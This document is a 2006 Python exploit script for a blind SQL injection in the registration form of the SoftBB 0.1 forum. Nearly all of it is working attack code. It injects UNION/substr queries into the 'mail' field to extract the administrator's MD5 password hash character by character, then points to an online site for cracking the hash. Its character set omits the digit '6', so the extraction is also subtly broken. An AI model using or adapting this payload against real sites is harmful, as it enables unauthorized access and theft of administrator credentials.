SoftBB 0.1 (mail) Remote Blind SQL Injection Exploit
====================================================




#!/usr/bin/env python
# LOTFREE TEAM 03/2006
#
# Vulnerability info
# Product : SoftBB
# Version : 0.1
#
# The field &#039;mail&#039; in reg.php is used directly in a SQL query :
# We can deduce deduce the result of some sql querys according to the error messages returned
# The exploit test the characters of the md5 hash one by one using a special query
import httplib, urllib

# Change the following values...
admin="admin"
server="localhost"
path="/forum"
#
hash=""
chars=(&#039;a&#039;,&#039;b&#039;,&#039;c&#039;,&#039;d&#039;,&#039;e&#039;,&#039;f&#039;,&#039;1&#039;,&#039;2&#039;,&#039;3&#039;,&#039;4&#039;,&#039;5&#039;,&#039;7&#039;,&#039;8&#039;,&#039;9&#039;,&#039;0&#039;)

print "LOTFREE TEAM SoftBB BruteForcing tool"
print "-------------------------------------"
for i in range(1,33):
  print "Brute forcing hash["+str(i)+"]"
  for a in chars:
    params=urllib.urlencode({&#039;pseudo&#039;:admin,
    &#039;mdp&#039;:&#039;1&#039;,
    &#039;mdpc&#039;:&#039;1&#039;,
    &#039;mail&#039;:&#039;" union select pseudo,1 from softbb_membres where pseudo="&#039;+admin+&#039;" and substr(mdp,&#039;+str(i)+&#039;,1)="&#039;+a+&#039;" limit 1,1#&#039;,
    &#039;condok&#039;:&#039;true&#039;})
    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
    conn = httplib.HTTPConnection(server)
    conn.request("POST", path+"/index.php?page=reg", params, headers)
    response = conn.getresponse()
    data = response.read()
    conn.close()
    if data.find("Ce pseudonyme est d")>0:
      hash=hash+a
      continue

print
if len(hash)==32:
  print "Found hash =",hash,"for account",admin
  print "You can use http://md5.rednoize.com/ to crack the md5 hash"
else:
  print "Exploit failed... verify the path to the forum or try changing the limit 1,1 in the sql request..." 



